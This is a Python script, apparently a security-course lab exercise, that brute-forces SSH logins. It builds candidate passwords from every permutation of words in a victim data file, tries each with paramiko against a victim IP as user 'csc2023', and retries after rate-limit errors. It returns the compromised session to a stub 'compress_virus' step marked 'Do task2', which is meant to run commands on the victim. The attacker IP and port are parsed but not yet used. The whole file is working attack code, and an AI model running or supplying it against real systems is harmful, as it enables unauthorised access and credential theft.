#!/usr/bin/env python3

from itertools import permutations
import paramiko
import socket
import time
import sys

sys.tracebacklimit = 0 # disable traceback printing

def get_parameters():
    if len(sys.argv) != 4:
        print("usage: ./crack_attack <Victim IP> <Attacker IP> <Attacker port>")
        exit(-1)

    return sys.argv[1 : ]


def get_words():
    with open("/home/csc2023/materials/victim.dat", "r") as file:
    # with open("/home/csc2023/Documents/test.txt", "r") as file:
        dictionary = file.read().splitlines()
        return dictionary


def get_possible_passwords(dictionary):
    possible_passwords = []
    for i in range (1, len(dictionary) + 1):        
        for combination in list(permutations(dictionary, i)):
            word = "".join(combination) 
            possible_passwords.append(word)
    # print(possible_passwords)
    return possible_passwords


def try_ssh_connect(victim_ip, possible_password):
    username = "csc2023"
    client   = paramiko.SSHClient()                           # initialize SSH client
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # add to know hosts
    try:
        client.connect(hostname=victim_ip, username=username, password=possible_password, timeout=5)
    except socket.timeout: 
        print(f"[!] Timeout: {victim_ip} is unreachable, password is {possible_password}")
        return False
    except paramiko.ssh_exception.NoValidConnectionsError: 
        print(f"[!] No valid connection: SSH connection cannot be established, password is {possible_password}")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Incorrect password: {possible_password} is invalid for {username}")
        return False    
    except paramiko.ssh_exception.SSHException as ssh_ex:
        print(f"[!] SSHException: {ssh_ex}")
        print("[!] Quota exceed, retrying with delay...")
        time.sleep(10)
        return(try_ssh_connect(victim_ip, possible_password))
    else:
        print(f"[!] Find password: The password of {username} is {possible_password}")
        return client


def crack_ssh_password(victim_ip, possible_passwords):
    for possible_password in possible_passwords:
        victim =  try_ssh_connect(victim_ip, possible_password)
        if victim:
            return victim
    print("[!] Cannot find the password")
    exit(-1)


def compress_virus(victim):
    # stdin, stdout, stderr = victim.exec_command("ls -a")
    # print(stdout.read().decode())
    print("Do task2")


def main():
    victim_ip, attacker_ip, attacker_port = get_parameters()
    dictionary = get_words()
    possible_passwords = get_possible_passwords(dictionary)
    # possible_passwords = ["csc2023"]
    victim = crack_ssh_password(victim_ip, possible_passwords)
    compress_virus(victim)
    victim.close()
        

if __name__ == '__main__':
    main()
